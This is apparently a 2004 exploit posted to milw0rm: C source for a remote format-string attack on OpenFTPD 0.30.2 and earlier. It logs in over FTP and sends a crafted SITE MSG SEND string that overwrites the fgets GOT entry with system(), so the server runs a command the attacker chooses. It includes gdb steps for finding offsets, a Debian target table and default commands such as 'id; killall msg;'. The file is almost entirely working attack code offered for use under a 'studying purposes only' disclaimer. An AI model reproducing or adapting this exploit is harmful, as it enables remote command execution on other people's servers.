/***********************************************************
* hoagie_openftpd.c
* LINUX/X86 OPENFTPD REMOTE EXLPOIT (<= 0.30.2)
*
* "
* Searching for those warez ftpd's out there and 
* leeching 'free' movies
* "
*
* Remote Linux/OpenFTPD exploit for the format string bug
* in the message system. This vulnerability was rediscovered 
* by a VOID.AT.
*
* HOWTO get the offsets
* andi@denkmal:~$ gdb ~/openftpd/bin/msg
* ...
*
* (gdb) x/i fgets
* 0x8048ae4 <fgets>: jmp *0x804db90
* ^^^^^^^^^
* the first one
* (gdb) break main
* Breakpoint 1 at 0x804bd05
* (gdb) r
* Starting program: /home/andi/openftpd/bin/msg
* [Thread debugging using libthread_db enabled]
* [New Thread 16384 (LWP 29479)]
* [Switching to Thread 16384 (LWP 29479)]
*
* Breakpoint 1, 0x0804bd05 in main ()
* (gdb) x/i system
* 0x40071c40 <system>: push %ebp
* ^^^^^^^^^^
* the second addresss 
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
* VOID.AT Security
* andi@void.at
* http://www.void.at
* 
************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>

enum EXPLOITSTATE { SENDUSER, SENDPASS, DELMESSAGE, PURGEMESSAGE, SENDMESSAGE, READMESSAGE, READING };

struct target_t {
char *sys;
char *libc;
int fgetsgot;
int system;
};

struct target_t targets[] = {
{ "Debian unstable", "2.3.2", 0x804db90, 0x40072c40 },
{ NULL, 0, 0 }
};

int connectserver(int *s, char *host, int port) {
struct sockaddr_in s_in;
struct hostent *he;
char *ip;

if ( (*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
fprintf(stderr,"[*] can't create TCP socket\n");
return -1;
}

memset(&s_in, 0, sizeof(s_in));
s_in.sin_family = AF_INET;
s_in.sin_port = htons(port);

if ( (he = gethostbyname(host)) != NULL)
memcpy(&s_in.sin_addr, he->h_addr, he->h_length);
else {
if ( (s_in.sin_addr.s_addr = inet_addr(host) ) < 0) {
return -3;
}
} 

if (connect(*s, (struct sockaddr *)&s_in, sizeof(s_in)) == -1) {
fprintf(stderr,"[*] can't connect to %s:%d\n", host, port);
return -4;
}
return 0;
}

int sendlogin(int s, char *username) {
char tmp[2048] = "";

snprintf(tmp, sizeof(tmp), "USER %s\n", username);
return write(s, tmp, strlen(tmp));
}

int sendpassword(int s, char *password) {
char tmp[2048] = "";

snprintf(tmp, sizeof(tmp), "PASS %s\n", password);
return write(s, tmp, strlen(tmp));
}

int purgemessage(int s) {
char tmp[2048] = "";

snprintf(tmp, sizeof(tmp), "SITE MSG PURGE\n");
return write(s, tmp, strlen(tmp));
}

int delmessage(int s) {
char tmp[2048] = "";

snprintf(tmp, sizeof(tmp), "SITE MSG DEL ALL\n");
return write(s, tmp, strlen(tmp));
}

int sendexploit(int s, char *username, int idx, char *exec) {
int i;
char tmp[4096], execcode[68], writecode[68];
unsigned short high, low, count1, count2;
int addr1, addr2;

high = targets[idx].system >> 16 & 0xFFFF;
low = targets[idx].system & 0xFFFF;

if (high > low) {
count1 = low;
count2 = high;
addr1 = targets[idx].fgetsgot;
addr2 = targets[idx].fgetsgot + 2;
} else {
count1 = high;
count2 = low;
addr1 = targets[idx].fgetsgot + 2;
addr2 = targets[idx].fgetsgot;
}

if (exec) {
strcpy(execcode, exec);
}
if (strlen(execcode) < 32) {
do {
strcat(execcode, "_");
} while (strlen(execcode) < 32);
}

/* calc count1:
*
* 1.) string will be stored in str => sprintf(str, " !C| !0%-66s !C|!0\n", buff);
* so we have to subtract 8 bytes from count1 (=> strlen("" !C| !0"))
* 2.) the next data will be our string for system call 
* so we have to subtract strlen(execcode) from count1
* 3.) at least we have to subtract 8 bytes for the two addresses that are 
* used for writing (%hn)
*/
count1 -= (strlen(execcode) + 16);
snprintf(writecode, sizeof(writecode), 
"%c%c%c%c%c%c%c%c%%%du%%18$hn%%%du%%19$hn",
addr1 & 0xFF, (addr1 >> 8) & 0xFF, (addr1 >> 16) & 0xFF, (addr1 >> 24) & 0xFF,
addr2 & 0xFF, (addr2 >> 8) & 0xFF, (addr2 >> 16) & 0xFF, (addr2 >> 24) & 0xFF,
count1, count2 - count1 - 0x30);
snprintf(tmp, sizeof(tmp), "SITE MSG SEND %s %s%s\n", username, execcode, writecode);
printf("[*] len: %d, sending code [%s]\n", strlen(execcode) + strlen(writecode), tmp);
return write(s, tmp, strlen(tmp));
}

int readmessage(int s) {
char tmp[2048] = "";

snprintf(tmp, sizeof(tmp), "SITE MSG READ\n");
return write(s, tmp, strlen(tmp));
}

int attack(int s, char *user, char *password, int idx, char *exec) {
fd_set fs;
int selret, state, len, code;
char buffer[2048] = "";

FD_ZERO(&fs);
FD_SET(s, &fs);

state = SENDUSER;

do {
selret = select(s + 1, &fs, NULL, NULL, NULL);
if (selret > 0 && FD_ISSET(s, &fs)) {
memset(buffer, 0, sizeof(buffer));
len = read(s, buffer, sizeof(buffer));
printf("<<< %s\n", buffer);
sscanf(buffer, "%d", &code);
switch(state) {
case SENDUSER: sendlogin(s, user);
state = SENDPASS;
break;
case SENDPASS: sendpassword(s, password);
state = DELMESSAGE;
break;
case DELMESSAGE: delmessage(s);
state = PURGEMESSAGE;
break;
case PURGEMESSAGE: purgemessage(s);
state = SENDMESSAGE;
break;
case SENDMESSAGE: if (code > 500) {
fprintf(stderr, "[*] login failed\n");
len = -1;
} else if (code == 230) {
fprintf(stderr, "[*] sending exploit code ...\n");
sendexploit(s, user, idx, exec);
state = READMESSAGE;
}
break;
case READMESSAGE: sleep(5);
readmessage(s);
state = READING;
break; 
case READING: if (code == 200 && strstr(buffer, "00000") && strstr(buffer, exec)) {
printf("[*] done\n");
}
break;
}
}
} while (len > 0);
}

void helpme(int argc, char **argv) {
int i;

printf("hoagie_openftpd - openftpd < 0.30.2 x86/linux remote\n");
printf("-andi / void.at\n\n");
printf("usage: %s -h hostname:port -u username -p password -t target -e command\n", argv[0]);
printf("\n\nexample:\n");
printf("%s -u localhost:21 -u anonymous -t 0 -e \"id > /tmp/0wned\"\n");
printf("\ntargets:\n");
for (i = 0; targets[i].sys != NULL; i++) {
printf("%d %s (libc: %s): 0x%0x 0x%0x\n", i, targets[i].sys, targets[i].libc, targets[i].fgetsgot, targets[i].system);
}
}

int main(int argc, char **argv) {
char optchar, *exec = NULL, server[512] = "", *username = NULL, *password = NULL;
int s, retval = -1, port, target = 0;

if (argc < 2) {
helpme(argc, argv);
} else {
while ( (optchar = getopt(argc, argv, "h:t:u:p:e:")) != EOF ) {
switch(optchar) {
case 'h': sscanf(optarg, "%[^:]:%d", server, &port);
break;
case 'u': username = optarg;
break;
case 'p': password = optarg;
break;
case 't': target = atoi(optarg);
break;
case 'e': exec = optarg;
break;
}
}

if (!strcmp(server, "")) {
strcpy(server, "127.0.0.1");
port = 21;
}

if (!username) {
username = "anonymous";
}

if (!password) {
password = "freak@kaefig.com";
}

if (!exec) {
exec = "id; killall msg; ";
}

fprintf(stderr, "[*] connecting %s:%d (%s/%s)...\n", server, port, username, password);
if (!connectserver(&s, server, port)) {
retval = attack(s, username, password, target, exec);
close(s);
}
}

return retval;
}

// milw0rm.com [2004-08-03]
